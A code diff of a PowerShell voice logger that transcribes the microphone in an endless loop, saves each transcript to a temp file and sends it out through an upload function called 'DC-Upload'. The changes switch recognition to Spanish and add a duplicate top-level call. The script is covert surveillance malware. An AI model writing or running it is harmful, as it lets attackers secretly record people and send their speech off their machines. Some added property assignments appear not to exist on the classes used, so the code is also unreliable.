@@ -19,12 +19,13 @@ function DC-Upload {
 
 
 function voiceLogger {
-
     Add-Type -AssemblyName System.Speech
     $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
     $grammar = New-Object System.Speech.Recognition.DictationGrammar
+    $grammar.Language = 'es-ES'  # Set the language code for Spanish (Spain)
     $recognizer.LoadGrammar($grammar)
     $recognizer.SetInputToDefaultAudioDevice()
+    $recognizer.RecognizeWithAlternates = $false  # Disable recognition with alternates
 
     while ($true) {
         $result = $recognizer.Recognize()
@@ -32,18 +33,21 @@ function voiceLogger {
             $results = $result.Text
             Write-Output $results
             $log = "$env:tmp/VoiceLog.txt"
-            echo $results > $log
-            $text = get-content $log -raw
+            Out-File -Encoding UTF8 -FilePath $log -InputObject $results
+            $text = Get-Content $log -Raw
             DC-Upload $text
 
             # Use a switch statement with the $results variable
             switch -regex ($results) {
-                '\bnote\b' {saps notepad}
+                '\bnote\b' {Start-Process notepad}
                 '\bexit\b' {break}
             }
         }
     }
     Clear-Content -Path $log
 }
+
+voiceLogger
+
 
 voiceLogger
